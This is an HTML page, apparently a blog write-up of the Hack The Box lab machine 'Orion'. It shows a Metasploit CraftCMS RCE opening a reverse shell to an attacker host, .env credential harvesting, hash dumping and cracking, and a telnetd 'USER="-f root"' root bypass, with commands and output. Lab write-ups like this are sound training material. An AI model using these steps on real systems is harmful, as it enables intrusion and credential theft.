@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Orion — Writeup | cosm3</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0a0f;
+            --bg-secondary: #11111a;
+            --bg-tertiary: #1a1a2e;
+            --accent-green: #00ff41;
+            --accent-cyan: #00d4ff;
+            --accent-red: #ff0040;
+            --accent-purple: #b829dd;
+            --accent-yellow: #ffd700;
+            --text-primary: #e0e0e0;
+            --text-secondary: #8888a0;
+            --border-color: #222233;
+            --glow-green: 0 0 10px rgba(0, 255, 65, 0.3);
+            --glow-cyan: 0 0 10px rgba(0, 212, 255, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            font-family: 'Fira Code', 'JetBrains Mono', monospace;
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        /* Animated background grid */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* Scanline effect */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0, 0, 0, 0.1) 2px,
+                rgba(0, 0, 0, 0.1) 4px
+            );
+            pointer-events: none;
+            z-index: 1000;
+            opacity: 0.3;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        /* Header */
+        header {
+            padding: 4rem 0 2rem;
+            text-align: center;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 3rem;
+            position: relative;
+        }
+
+        header::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 200px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent-green), transparent);
+        }
+
+        .ascii-banner {
+            font-size: 0.7rem;
+            line-height: 1.2;
+            color: var(--accent-green);
+            text-shadow: var(--glow-green);
+            margin-bottom: 1.5rem;
+            white-space: pre;
+            overflow-x: auto;
+        }
+
+        .tagline {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        /* Badges */
+        .badges {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 0.5rem;
+            margin: 1.5rem 0;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 0.3rem 0.8rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .badge-htb {
+            background: rgba(46, 164, 79, 0.15);
+            color: var(--accent-green);
+            border: 1px solid rgba(46, 164, 79, 0.3);
+        }
+
+        .badge-linux {
+            background: rgba(0, 0, 0, 0.3);
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+        }
+
+        .badge-rooted {
+            background: rgba(255, 0, 64, 0.15);
+            color: var(--accent-red);
+            border: 1px solid rgba(255, 0, 64, 0.3);
+        }
+
+        .badge-cve {
+            background: rgba(0, 212, 255, 0.15);
+            color: var(--accent-cyan);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+
+        .badge:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Sections */
+        section {
+            margin-bottom: 3rem;
+            padding: 2rem;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(180deg, var(--accent-green), transparent);
+        }
+
+        h2 {
+            color: var(--accent-green);
+            font-size: 1.4rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        h2::before {
+            content: '>';
+            color: var(--accent-cyan);
+        }
+
+        h3 {
+            color: var(--accent-cyan);
+            font-size: 1.1rem;
+            margin: 1.5rem 0 1rem;
+            padding-left: 1rem;
+            border-left: 2px solid var(--accent-purple);
+        }
+
+        p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        /* Code blocks */
+        pre {
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 1.5rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            position: relative;
+        }
+
+        pre::before {
+            content: 'bash';
+            position: absolute;
+            top: 0;
+            right: 0;
+            padding: 0.3rem 0.8rem;
+            background: var(--accent-purple);
+            color: var(--bg-primary);
+            font-size: 0.7rem;
+            font-weight: 700;
+            border-bottom-left-radius: 6px;
+        }
+
+        pre.msfsession::before {
+            content: 'msf';
+            background: var(--accent-red);
+        }
+
+        pre.sql::before {
+            content: 'sql';
+            background: var(--accent-cyan);
+        }
+
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-green);
+        }
+
+        pre code {
+            color: var(--text-primary);
+            display: block;
+            line-height: 1.6;
+        }
+
+        /* Syntax highlighting */
+        .comment { color: #6a737d; }
+        .string { color: #a5d6ff; }
+        .keyword { color: #ff7b72; }
+        .function { color: #d2a8ff; }
+        .number { color: #79c0ff; }
+        .prompt { color: var(--accent-green); }
+        .output { color: var(--text-secondary); }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+        }
+
+        th {
+            background: var(--bg-tertiary);
+            color: var(--accent-cyan);
+            padding: 0.8rem;
+            text-align: left;
+            border-bottom: 2px solid var(--accent-cyan);
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+        }
+
+        td {
+            padding: 0.8rem;
+            border-bottom: 1px solid var(--border-color);
+            color: var(--text-secondary);
+        }
+
+        tr:hover td {
+            background: rgba(0, 255, 65, 0.05);
+            color: var(--text-primary);
+        }
+
+        /* Lists */
+        ul, ol {
+            margin: 1rem 0 1rem 2rem;
+            color: var(--text-secondary);
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+        }
+
+        li::marker {
+            color: var(--accent-green);
+        }
+
+        /* Blockquote */
+        blockquote {
+            border-left: 3px solid var(--accent-yellow);
+            padding-left: 1.5rem;
+            margin: 1.5rem 0;
+            font-style: italic;
+            color: var(--text-secondary);
+        }
+
+        /* Horizontal rule */
+        hr {
+            border: none;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--border-color), transparent);
+            margin: 3rem 0;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 3rem 0;
+            border-top: 1px solid var(--border-color);
+            margin-top: 3rem;
+        }
+
+        .root-prompt {
+            color: var(--accent-red);
+            font-size: 1.2rem;
+            font-weight: 700;
+            text-shadow: 0 0 10px rgba(255, 0, 64, 0.3);
+            margin-bottom: 1rem;
+        }
+
+        .quote {
+            color: var(--text-secondary);
+            font-style: italic;
+            margin-bottom: 1.5rem;
+        }
+
+        .github-link {
+            display: inline-block;
+            padding: 0.5rem 1.5rem;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-primary);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .github-link:hover {
+            border-color: var(--accent-green);
+            box-shadow: var(--glow-green);
+            transform: translateY(-2px);
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-green);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .ascii-banner {
+                font-size: 0.4rem;
+            }
+
+            section {
+                padding: 1.5rem;
+            }
+
+            .container {
+                padding: 0 1rem;
+            }
+        }
+
+        /* Animations */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .blink {
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        section {
+            animation: slideIn 0.5s ease forwards;
+        }
+
+        section:nth-child(2) { animation-delay: 0.1s; }
+        section:nth-child(3) { animation-delay: 0.2s; }
+        section:nth-child(4) { animation-delay: 0.3s; }
+        section:nth-child(5) { animation-delay: 0.4s; }
+    </style>
+<base target="_blank">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="ascii-banner">
+    ██████  ██▀███   ▒█████   ██▓ ███▄    █ 
+  ▒██    ▒ ▓██ ▒ ██▒▒██▒  ██▒▓██▒ ██ ▀█   █ 
+  ░ ▓██▄   ▓██ ░▄█ ▒▒██░  ██▒▒██▒▓██  ▀█ ██▒
+    ▒   ██▒▒██▀▀█▄  ▒██   ██░░██░▓██▒  ▐▌██▒
+  ▒██████▒▒░██▓ ▒██▒░ ████▓▒░░██░▒██░   ▓██░
+  ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▓  ░ ▒░   ▒ ▒ 
+  ░ ░▒  ░ ░  ░▒ ░ ▒░  ░ ▒ ▒░  ▒ ░░ ░░   ░ ▒░
+  ░  ░  ░    ░░   ░ ░ ░ ░ ▒   ▒ ░   ░   ░ ░ 
+        ░     ░         ░ ░   ░           ░ 
+            </div>
+            <p class="tagline">Hack The Box | Easy | Linux | CVE-2025-32432 | CVE-2026-24061</p>
+            <div class="badges">
+                <span class="badge badge-htb">HackTheBox</span>
+                <span class="badge badge-linux">Linux</span>
+                <span class="badge badge-rooted">Rooted</span>
+                <span class="badge badge-cve">CVE-2025-32432</span>
+                <span class="badge badge-cve">CVE-2026-24061</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="container">
+        <section>
+            <h2>Synopsis</h2>
+            <p>Orion is an <strong>Easy Linux machine</strong> featuring a vulnerable <strong>CraftCMS 5.6.16</strong> instance. The attack chain involves CSRF bypass, unauthenticated RCE via image transform deserialization, MySQL credential harvesting, and telnetd authentication bypass.</p>
+
+            <blockquote>
+                "From CraftCMS deserialization to telnetd auth bypass — two CVEs, one shell, full root."
+            </blockquote>
+
+            <h3>Attack Chain</h3>
+            <ol>
+                <li><span style="color: var(--accent-green)">Reconnaissance</span> — Nmap, Gobuster, web enumeration</li>
+                <li><span style="color: var(--accent-cyan)">CSRF Bypass</span> — Extract tokens from /admin/login</li>
+                <li><span style="color: var(--accent-purple)">RCE</span> — CVE-2025-32432 (CraftCMS Image Transform)</li>
+                <li><span style="color: var(--accent-yellow)">Credential Harvesting</span> — .env → MySQL → bcrypt hash</li>
+                <li><span style="color: var(--accent-red)">PrivEsc</span> — CVE-2026-24061 (telnetd auth bypass)</li>
+            </ol>
+        </section>
+
+        <section>
+            <h2>Reconnaissance</h2>
+
+            <h3>Nmap Scan</h3>
+            <pre><code><span class="prompt">$</span> nmap -sCV 10.129.106.206
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://orion.htb/</code></pre>
+
+            <h3>Host Resolution</h3>
+            <pre><code><span class="prompt">$</span> echo "10.129.106.206 orion.htb" | sudo tee -a /etc/hosts</code></pre>
+
+            <h3>Web Enumeration</h3>
+            <p>Visiting <code>http://orion.htb</code> reveals <strong>Orion Telecom</strong>. Key findings:</p>
+            <ul>
+                <li>Footer exposes: <code>Powered by CraftCMS</code></li>
+                <li>Admin panel at: <code>/admin/login</code></li>
+                <li>Version exposed: <code>Craft CMS 5.6.16</code> ⚠️</li>
+            </ul>
+
+            <h3>Directory Enumeration</h3>
+            <table>
+                <tr>
+                    <th>Path</th>
+                    <th>Status</th>
+                    <th>Notes</th>
+                </tr>
+                <tr>
+                    <td><code>/admin</code></td>
+                    <td>302 → /admin/login</td>
+                    <td>Admin panel</td>
+                </tr>
+                <tr>
+                    <td><code>/assets</code></td>
+                    <td>301</td>
+                    <td>Asset directory</td>
+                </tr>
+                <tr>
+                    <td><code>/logout</code></td>
+                    <td>302</td>
+                    <td>Logout endpoint</td>
+                </tr>
+            </table>
+        </section>
+
+        <section>
+            <h2>Foothold: CVE-2025-32432</h2>
+
+            <h3>Vulnerability Analysis</h3>
+            <p><strong>CVE-2025-32432</strong> is a deserialization vulnerability in CraftCMS's image transformation function. The <code>generate-transform</code> action accepts JSON data that instantiates arbitrary PHP classes, leading to <strong>unauthenticated Remote Code Execution</strong>.</p>
+
+            <h3>CSRF Token Extraction</h3>
+            <pre><code><span class="prompt">$</span> curl -s -c cookies.txt -b cookies.txt http://orion.htb/admin/login > login.html
+<span class="prompt">$</span> CSRF_TOKEN=$(grep -o 'csrfTokenValue":"[^"]*"' login.html | cut -d'"' -f4)</code></pre>
+
+            <h3>Metasploit Exploitation</h3>
+            <pre class="msfsession"><code><span class="prompt">msf ></span> search craftcms
+<span class="prompt">msf ></span> use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
+<span class="prompt">msf exploit ></span> set RHOSTS 10.129.106.206
+<span class="prompt">msf exploit ></span> set VHOST orion.htb
+<span class="prompt">msf exploit ></span> set LHOST 10.10.16.33
+<span class="prompt">msf exploit ></span> run
+
+<span class="output">[*] Started reverse TCP handler on 10.10.16.33:4444
+[*] Running automatic check
+[+] Leaked session.save_path: /var/lib/php/sessions
+[+] The target is vulnerable. Session path leaked
+[*] Injecting stub & triggering payload...
+[*] Sending stage (45739 bytes) to 10.129.106.206
+[*] Meterpreter session 1 opened</span></code></pre>
+
+            <h3>Shell Stabilization</h3>
+            <pre><code><span class="prompt">meterpreter ></span> shell
+<span class="prompt">$</span> python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="output">www-data@orion:~/html/craft/web$</span></code></pre>
+        </section>
+
+        <section>
+            <h2>Lateral Movement</h2>
+
+            <h3>MySQL Credential Harvesting</h3>
+            <pre><code><span class="prompt">$</span> find / -name ".env" 2>/dev/null
+<span class="output">/var/www/html/craft/.env</span>
+
+<span class="prompt">$</span> cat /var/www/html/craft/.env
+<span class="output">CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!</span></code></pre>
+
+            <h3>User Credential Extraction</h3>
+            <pre class="sql"><code><span class="prompt">$</span> mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT username, email, password FROM orion.users;"
+
++----------+----------------+--------------------------------------------------------------+
+| username | email          | password                                                     |
++----------+----------------+--------------------------------------------------------------+
+| admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
++----------+----------------+--------------------------------------------------------------+</code></pre>
+
+            <h3>Hash Cracking</h3>
+            <pre><code><span class="prompt">$</span> echo '$2y$13$...' > hash.txt
+<span class="prompt">$</span> john hash.txt
+<span class="output">$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel</span></code></pre>
+
+            <h3>SSH Access</h3>
+            <pre><code><span class="prompt">$</span> ssh adam@orion.htb
+<span class="output">adam@orion.htb's password: darkangel
+
+adam@orion:~$</span></code></pre>
+        </section>
+
+        <section>
+            <h2>Privilege Escalation: CVE-2026-24061</h2>
+
+            <h3>Vulnerability Analysis</h3>
+            <p><strong>CVE-2026-24061</strong> affects <strong>GNU inetutils telnetd 2.7</strong>. The vulnerability allows <strong>authentication bypass</strong> by manipulating the <code>USER</code> environment variable. When <code>USER="-f root"</code> is passed, telnetd executes <code>login -f root</code>, skipping authentication entirely.</p>
+
+            <h3>Enumeration</h3>
+            <pre><code><span class="prompt">$</span> netstat -tulnp | grep 23
+<span class="output">tcp  0  0 127.0.0.1:23  0.0.0.0:*  LISTEN</span>
+
+<span class="prompt">$</span> telnet --version
+<span class="output">telnet (GNU inetutils) 2.7</span></code></pre>
+
+            <h3>Exploitation</h3>
+            <pre><code><span class="prompt">$</span> USER="-f root" telnet -a 127.0.0.1
+
+<span class="output">Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+Linux 5.15.0-171-generic (orion) (pts/2)
+Welcome to Ubuntu 22.04.5 LTS
+
+root@orion:~# whoami
+root</span></code></pre>
+        </section>
+
+        <section>
+            <h2>Flags</h2>
+
+            <pre><code><span class="prompt">adam@orion:~$</span> cat user.txt
+<span class="output" style="color: var(--accent-green)">32ebe244f540b03fbe40f9993053e0bf</span>
+
+<span class="prompt">root@orion:~#</span> cat root.txt
+<span class="output" style="color: var(--accent-red)">[REDACTED — root your own box!]</span></code></pre>
+        </section>
+
+        <section>
+            <h2>Tools Used</h2>
+            <table>
+                <tr>
+                    <th>Tool</th>
+                    <th>Purpose</th>
+                </tr>
+                <tr>
+                    <td><code>nmap</code></td>
+                    <td>Port scanning & service enumeration</td>
+                </tr>
+                <tr>
+                    <td><code>gobuster</code></td>
+                    <td>Directory enumeration</td>
+                </tr>
+                <tr>
+                    <td><code>curl</code></td>
+                    <td>HTTP requests & CSRF token extraction</td>
+                </tr>
+                <tr>
+                    <td><code>Metasploit</code></td>
+                    <td>CVE-2025-32432 exploitation</td>
+                </tr>
+                <tr>
+                    <td><code>john</code></td>
+                    <td>Bcrypt hash cracking</td>
+                </tr>
+                <tr>
+                    <td><code>mysql</code></td>
+                    <td>Database credential extraction</td>
+                </tr>
+                <tr>
+                    <td><code>telnet</code></td>
+                    <td>CVE-2026-24061 exploitation</td>
+                </tr>
+            </table>
+        </section>
+
+        <section>
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-32432" style="color: var(--accent-cyan)">CVE-2025-32432 — NVD</a></li>
+                <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24061" style="color: var(--accent-cyan)">CVE-2026-24061 — NVD</a></li>
+                <li><a href="https://craftcms.com/docs/5.x/" style="color: var(--accent-cyan)">CraftCMS Documentation</a></li>
+                <li><a href="https://app.hackthebox.com/machines/Orion" style="color: var(--accent-cyan)">Hack The Box — Orion</a></li>
+            </ul>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="root-prompt">root@orion:~# cat /root/root.txt</div>
+            <p class="quote">"The stars align for those who persist." ⭐</p>
+            <a href="https://github.com/cosm3" class="github-link">github.com/cosm3</a>
+        </div>
+    </footer>
+</body>
+</html>
